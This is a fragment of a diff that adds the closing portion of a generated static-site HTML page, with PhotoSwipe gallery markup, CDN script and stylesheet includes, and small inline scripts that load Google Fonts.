+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c360ad02a41a6ed7f0240895667de2af6b7bfd79a8c71b3ed3008667720bb9d1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+    </body>
+</html>
